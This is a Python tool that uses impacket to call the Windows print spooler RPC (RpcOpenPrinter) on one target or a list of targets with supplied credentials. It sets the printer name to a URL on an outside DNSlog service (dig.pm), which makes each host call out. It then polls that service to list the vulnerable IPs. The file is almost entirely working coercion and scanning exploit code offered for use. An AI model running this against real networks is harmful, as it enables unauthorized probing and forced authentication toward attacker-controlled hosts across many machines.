# -*- coding:utf-8 -*-
"""
@Author: syyu
@File: WinRpcTest
@Time: 2022/3/5 18:25
@Desc: Everything is possible.
"""

from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport

import argparse
import requests
import json




TS = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
IFACE_UUID = rprn.MSRPC_UUID_RPRN

username = ''
password = ''
domain = ''
lmhash = ''
nthash = ''



def banner():
    pass

def GetDNSlog():
    base_res = requests.post("https://dig.pm/new_gen",data="domain=dns.1433.eu.org.",timeout=5).text
    base_domain, res_token = json.loads(base_res)['domain'], json.loads(base_res)['token']
    print("GetDNSlogInfo:", base_domain, res_token)
    return base_domain, res_token


def GetDNSlogRes(base_domain,res_token):
    datas = {
        'domain': base_domain,
        'token': res_token
    }
    try:
        res = requests.post("https://dig.pm/get_results", data=datas,timeout=5)
        # print(res.text)
        res_json = json.loads(res.text)

        if res_json:
            ips = []
            print("\nsuccessful ips: ")
            for i in res_json:
                ip_temp = str(res_json[i]['subdomain']).split(".")
                del ip_temp[-6:]
                ip = ".".join(ip_temp)
                if ip not in ips:
                    ips.append(ip)
            [print(x) for x in ips]
        else:
            print("\nIps all False!\n")
    except:
        pass




def Dce_IpsFile(filename, username, password):
    ips = open(filename,"r").readlines()
    for ip in ips:
        ip = ip.strip()
        Dce_ip(ip, username, password)

def Dce_ip(ip, username, password):
    global base_domain,res_cookie
    ncacn_np = rf'ncacn_np:{ip}[\pipe\spoolss]'
    # print(ncacn_np)
    rpctransport = transport.DCERPCTransportFactory(ncacn_np)
    username = username
    password = password
    print(ip, "...",end=" | ")
    try:
        rpctransport.set_credentials(username, password, domain, lmhash, nthash)
        rpctransport.set_connect_timeout(timeout=3)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(IFACE_UUID, transfer_syntax=TS)
        request = rprn.RpcOpenPrinter()
        if rpctransport:
            target_url = rf"http://{ip}.{base_domain}/"
            request['pPrinterName'] = '%s\x00' % target_url
            request['pDatatype'] = NULL
            request['pDevModeContainer']['pDevMode'] = NULL
            request['AccessRequired'] = rprn.SERVER_READ

            dce.request(request)

            rpctransport.disconnect()

    except Exception as err:
        # pass
        # print(str(err))
        if "LOGON_FAILURE" in str(err):
            print("LOGON_FAILURE!")
        elif "OBJECT_NAME_NOT_FOUND" in str(err):
            print("OBJECT_NAME_NOT_FOUND!")
        elif "timed out" in str(err):
            print("Connect Host Time Out!")
        elif "0x709" in str(err):
            print("Maybe successful!")
        else:
            print("False!")

if __name__ == '__main__':
    base_domain, res_token = "", ""
    parser = argparse.ArgumentParser(description="Win RPC test")
    parser.add_argument('--target', '-t', type=str, help='TargetIP')
    parser.add_argument('--file', '-f', type=str, help='TargetIpsFile')
    parser.add_argument('--username', '-u', required=True, type=str, help='UserName')
    parser.add_argument('--password', '-p', required=True, type=str,help='PassWord')
    # todo： 增加 nthash 和 lmhash 认证方式。
    args = parser.parse_args()

    if (args.target != None) | (args.file != None):
        try:
            base_domain, res_token = GetDNSlog()
        except:
            exit("get DNSlog domain fail！")

    if args.target:
        Dce_ip(args.target, args.username, args.password)
        GetDNSlogRes(base_domain, res_token)

    elif args.file:
        Dce_IpsFile(args.file, args.username, args.password)
        GetDNSlogRes(base_domain, res_token)

    else:
        print("Missing Parameters！\neg: python WinRPCtest.py -t 192.168.101.10 -u administrator -p admin123\n \
         python WinRPCtest.py -f ips.txt -u administrator -p admin123")

    # Dce_ip("192.168.119.135", "administrator", "admin123")